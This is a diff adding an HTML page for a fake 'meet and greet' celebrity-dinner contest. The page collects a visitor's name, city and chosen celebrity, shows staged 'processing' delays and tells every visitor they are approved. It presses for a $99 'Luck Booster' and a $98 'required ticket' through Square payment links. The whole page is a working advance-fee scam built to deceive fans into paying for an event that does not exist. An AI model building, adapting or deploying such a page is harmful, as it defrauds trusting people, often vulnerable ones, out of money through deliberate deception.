@@ -1,1 +1,729 @@
 
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script>
+
+ <meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+
+
+
+
+
+
+
+
+<title>Meet and Greet</title>
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing, #processing2 {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    margin: 12px;
+    border: 8px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: #306754 transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #myForm {
+    width: 100%;
+    height: 45px;
+    border-radius: 0px;
+  }
+
+  /* Input Fields and Labels */
+  #myForm input, #myForm label {
+    font-size: 17px;
+    font-weight: bold;
+    display: block;
+    border: 3px solid #306754;
+  }
+
+  #myForm input {
+    width: 99%;
+    height: 49px;
+    color: #000000;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+  /* Input Field Focus (when clicked) */
+  #myForm input:focus {
+    outline: none;
+    border-color: #000000;
+  }
+
+  /* Labels */
+  #myForm label {
+    margin-bottom: 3px;
+  }
+
+  /* Submit Button Spacing */
+  #myForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #secondForm {
+    width: 100%;
+    height: 45px;
+    border-radius: 1px;
+  }
+
+  /* Input Fields and Labels */
+  #secondForm input, #secondForm label {
+    font-size: 17px;
+    font-weight: bold;
+    display: block;
+  }
+
+  #secondForm input {
+    width: 94%;
+    height: 45px;
+    color: black;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+  /* Input Field Focus (when clicked) */
+  #secondForm input:focus {
+    outline: none;
+    border-color: Red;
+  }
+
+  /* Labels */
+  #secondForm label {
+    margin-bottom: 5px;
+  }
+
+  /* Submit Button Spacing */
+  #secondForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+<script>
+  async function convertCurrency() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      const country = data.country_code;
+
+      const currencySymbolElements = document.getElementsByClassName('currency-symbol');
+
+      if (country === 'GB') {
+        Array.from(currencySymbolElements).forEach(element => {
+          element.textContent = '£';
+        });
+      } else if (country === 'DE' || country === 'FR' || country === 'ES' || country === 'NL') {
+        Array.from(currencySymbolElements).forEach(element => {
+          element.textContent = '€';
+        });
+      }
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  }
+  
+  document.addEventListener('DOMContentLoaded', convertCurrency);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const phoneNumber = document.getElementById("phonenumber").value; // Get phone number
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      const submittedEmailElements = document.getElementsByClassName("submittedEmail");
+      const submittedPhoneElements = document.getElementsByClassName("submittedPhone"); // Handle phone number
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      for (let i = 0; i < submittedEmailElements.length; i++) {
+        submittedEmailElements[i].textContent = email;
+      }
+      
+      for (let i = 0; i < submittedPhoneElements.length; i++) {
+        submittedPhoneElements[i].textContent = phoneNumber; // Display phone number
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 3000); // Change delay to 3 seconds
+  }
+
+  function submitSecondForm() {
+    // Hide the second form
+    document.getElementById("secondForm").style.display = "none";
+    
+    // Display the "Processing" message for the second form
+    document.getElementById("processing2").style.display = "block";
+    
+    // Delay displaying the second form's main content
+    setTimeout(function() {
+      // Hide the processing message for the second form
+      document.getElementById("processing2").style.display = "none";
+      
+      // Display the second form's submitted content
+      const mainContent2 = document.getElementById("mainContent2");
+      mainContent2.style.display = "block";
+      
+      // Get the second form data
+      const fullName = document.getElementById("fullName").value;
+      const email2 = document.getElementById("email2").value;
+      const phone2 = document.getElementById("phone2").value;
+      const address = document.getElementById("address").value;
+      const city = document.getElementById("city").value;
+      const country = document.getElementById("country").value;
+
+      // Set the submitted data to specific elements
+      document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+      document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+      document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+      document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+      document.querySelectorAll(".submittedCity").forEach(el => el.textContent = city);
+      document.querySelectorAll(".submittedCountry").forEach(el => el.textContent = country);
+
+      // Scroll to the second form's main content
+      mainContent2.scrollIntoView({ behavior: 'smooth' });
+    }, 34000); // Change delay to 3 seconds
+  }
+</script>
+</head>
+<body>
+
+<div> 
+  <div class="formbold-form-wrapper">
+
+    <!-- Original Form -->
+    <form id="myForm" onsubmit="submitForm(); return false;">
+
+
+
+<style>
+  .text-107px {
+    font-size: 19px;
+    padding: 9px;
+  }
+</style>
+<h5 class="text-107px">
+	 This is your best opportunity to win an intimate private dinner with your favorite celebrity. Please confirm the details below. 
+<br><br>
+</h5></h5>
+
+
+
+
+
+
+
+
+<style>
+  .text-154px {
+    font-size: 18px;
+    padding: 12px;
+  }
+</style>
+
+<h5 class="text-154px">
+
+
+      <div class="formbold-mb-5">
+<strong>
+       Enter the name of the celebrity you'd like to meet
+
+        <center>
+          <input type="text" required name="A_" id="name" placeholder="Enter the Name of the Celebrity" class="formbold-form-input" />
+        </center>
+      </div>
+
+
+
+
+
+
+
+ <br><br><br>
+
+ <div class="formbold-mb-5">
+        How long have you been a fan? 
+        <center>
+          <input type="text" 
+
+ class="formbold-form-input" placeholder="How long have you been a fan?" />
+        </center>
+      </div>
+
+
+
+
+
+
+
+
+
+
+  <br><br>
+
+      <div class="formbold-mb-5">
+        Enter your first and last name
+        <center>
+          <input type="text" id="email" required name="A_" class="formbold-form-input" placeholder="Enter your first and last name" />
+        </center>
+      </div>
+
+
+
+
+
+      <br><br>
+      
+      Enter the name of your city
+
+      <center>
+        <input type="text" id="phonenumber" name="A_" placeholder="Enter the name of your city"  
+
+
+
+
+required
+class="formbold-form-input" />
+      </center>
+
+
+
+
+
+
+
+<br>
+      <div>
+
+
+        <center> 
+<button type="submit" style="width: 97%; height: 47px; border: 0px solid #000; border-radius: 30px; background-color: #306754; color: #ffffff; font-size: 19px; font-weight: bold; cursor: pointer;">CONTINUE</button></center>
+</h5><br><br><br><br><br><br>
+      </div></strong>
+    </form>
+
+  </div>
+</div>
+
+<div id="processing">
+  
+
+<style>
+  .text-amakappx {
+    font-size: 24px;
+    padding: 1px;
+  }
+</style>
+<h5 class="text-amakappx">
+ 
+
+<strong>
+<br><br><br><br>Please  Wait. . . </strong></h5>
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+<div id="mainContent">
+
+  <!-- New Form -->
+  <form id="secondForm" onsubmit="submitSecondForm(); return false;">
+
+
+
+
+
+<style>
+  .text-amgakapx {
+    font-size: 18px;
+    padding: 10px;
+  }
+</style>
+<h5 class="text-amgakapx">
+ 
+<strong>
+IMPORTANT: 
+<br><br></strong>
+
+ Hi <span class="submittedEmail"></span>, to proceed, please note that you have two options. Please read the text below carefully to understand your two options:
+
+
+
+<br>
+<br><br><br>
+
+
+<strong>Option 1: FREE</strong><br>
+
+
+While you have the option to continue your meet and greet application for Free, the downside of continuing for Free is that you have a very low chance of approval for the <span class="submittedName"></span>  private meet and greet.
+
+
+
+
+
+<br><br><br>
+
+<strong>Option 2: LUCK BOOSTER</strong> 
+<br>
+
+
+ 
+
+
+The Luck Booster is recommended if you want guaranteed approval for  the meet and greet private, intimate dinner with <span class="submittedName"></span> in <span class="submittedPhone"></span>  and  even a chance to receive a hug from <span class="submittedName"></span> himself. As a special offer, the Luck Booster, which secures your spot in the meet and greet and gives you a unique chance of getting a private dinner with <span class="submittedName"></span>, has been discounted to just <strong><span class="currency-symbol">$</span>99</strong>, making it more affordable. <br>
+
+<br><span class="submittedEmail"></span>, after you've read and understood the difference between Free and Luck Booster, please select which option you'd prefer below: 
+
+
+</h5>
+<br>
+
+
+
+<center> 
+	
+	<a href="https://square.link/u/xjFBZt5L">
+	
+<span style="display: block; width: 96%; height: 45px; background-color: #306754; border-radius: 30px; font-size: 18px; color: #fff; text-align: center; line-height: 45px; cursor: pointer;"><strong>Luck Booster: guaranteed approval</strong></span></center></a>
+
+
+
+<br>
+<br>
+
+
+
+    <div class="formbold-mb-5">
+        <center>
+        <input type="text" 
+style="display: none;  id="fullName" placeholder="Enter Full Name"  class="formbold-form-input" />
+      </center>
+    </div>
+
+   
+    <center>
+      <input type="email"
+style="display: none;  id="email2" placeholder="Enter Email" class="formbold-form-input" />
+    </center>
+
+    
+    <center>
+      <input type="text" style="display: none;  id="phone2" placeholder="Enter Phone Number" class="formbold-form-input" />
+    </center>
+
+    
+    <center>
+      <input type="text" style="display: none;  id="address" placeholder="Enter Address" class="formbold-form-input" />
+    </center>
+
+   
+    <center>
+      <input type="text" style="display: none;  id="city" placeholder="Enter City" class="formbold-form-input" />
+    </center>
+
+    
+    <center>
+      <input type="text"
+style="display: none; 
+ id="country" placeholder="Enter Country" class="formbold-form-input" />
+    </center>
+
+    <div>
+     
+
+ <center> 
+<button type="submit" style="width: 96%; height: 43px; border: 0px solid #000; border-radius: 30px; background-color: #306754; color: #ffffff; font-size: 18px; font-weight: bold; cursor: pointer;">Free: low chance of approval</button></center>
+
+
+    </div>
+
+
+
+<br><br><br><br><br><br>
+  </form>
+</div>
+
+<div id="processing2">
+  
+
+
+
+
+<style>
+  .text-deborahhppx {
+    font-size: 18px;
+    padding: 5px;
+  }
+</style>
+<h5 class="text-deborahhppx">
+ 
+
+<br><br>
+<strong>
+Your application is now processing.
+
+<br><br>
+
+If you are approved, you'll win a private dinner with the legendary  <span class="submittedName"></span>. But if you are not approved, you can try again next year.
+
+<br><br><br>
+
+
+You'll get the results of whether you are approved or not in the next few seconds. So please stay on this page and wait.
+
+</strong>
+<br><br>
+</h5>
+
+
+
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+<div id="mainContent2" style="display: none;">
+
+
+
+
+
+
+<style>
+  .text-amakapx {
+    font-size: 22px;
+    padding: 1px;
+  }
+</style>
+<h5 class="text-amakapx">
+ 
+
+ <center><strong>Approved </strong> &nbsp
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQj6dsE4bZEG-KyDhF2kgJAxwm9k2Fqxq1Qw&amp;usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4094px; width: 44px; height: 44px; margin: 0px;" alt="verify&quot; Icon - Download for free – Iconduck" role="button" tabindex="0" aria-label="verify&quot; Icon - Download for free – Iconduck Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
+
+</center>
+
+</h5>
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  .text-amaklovpx {
+    font-size: 18px;
+    padding: 9px;
+  }
+</style>
+<h5 class="text-amaklovpx">
+ 
+
+
+
+
+Well done, <span class="submittedEmail"></span>.  You are  approved for the meet and greet.
+
+
+<span class="submittedName"></span> has hosted this event since 1997, and you're this year's  winner.  Your  meet and greet with <span class="submittedName"></span> is on  September 26, 2025, in <span class="submittedPhone"></span>. You will receive further details regarding the venue, time, and  other relevant documentation by mail. 
+<br><br>
+
+As with most meet and greets, your primary identification for the private dinner with <span class="submittedName"></span> will be a  ticket, granting you authorized access to the event.  Note that failure to obtain this ticket will result in forfeiting your meet and greet. 
+<br>
+<br><br><br>
+You can easily purchase this ticket at a discounted price of just <span class="currency-symbol">$</span>98. 
+
+
+<strong>
+<span class="submittedEmail"></span></strong>, while the <span class="currency-symbol">$</span>98 ticket purchase may
+
+
+seem like a significant amount
+
+ depending on your  financial situation, it will be worth it, as this required ticket ensures authorized access to the event, offering you a private one-on-one dinner with <span class="submittedName"></span>  and even the chance for a hug from <span class="submittedName"></span>.
+
+ This rare experience gives you a chance to connect with <span class="submittedName"></span> on a deeply personal level, making the <span class="currency-symbol">$</span>98 ticket price well worth it.
+
+<br><br>
+
+
+<a href="https://square.link/u/8DxF5vY3">
+<center> 
+<button type="submit" style="width: 96%; height: 40px; border: 0px solid #000; border-radius: 30px; background-color: #306754; color: #ffffff; font-size: 19px; font-weight: ; cursor: pointer;">Ticket</button></center>
+</a>
+
+
+
+
+<br><br><br>
+
+<a href="https://square.link/u/8DxF5vY3">
+
+<img style="-webkit-user-select: none;max-width: 100%;margin: auto;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRx9ff3vVlOMD-kv9S9SG7y2Y562UmGFjeYRw&amp;amp;usqp=CAU">
+</a>
+
+
+
+<br><br><br><br>
+
+<font style="display: none;">
+
+<span class="submittedFullName"></span>
+
+ <span class="submittedEmail2"></span>
+   
+<span class="submittedPhone2"></span>
+    
+ <span class="submittedAddress"></span>
+ 
+    <span class="submittedCity"></span>
+
+  <span class="submittedCountry"></span>
+
+
+
+
+
+
+    <span class="submittedEmail"></span>
+
+ <span class="submittedName"></span> 
+
+
+<span class="submittedPhone"></span> 
+  
+ 
+
+</font>
+
+</div>
+
+
+<script>
+  // Ensure both forms and processing sections are hidden initially
+  document.getElementById("processing").style.display = "none";
+  document.getElementById("processing2").style.display = "none";
+  document.getElementById("myForm").style.display = "block";
+</script>
+</body>
+</html>
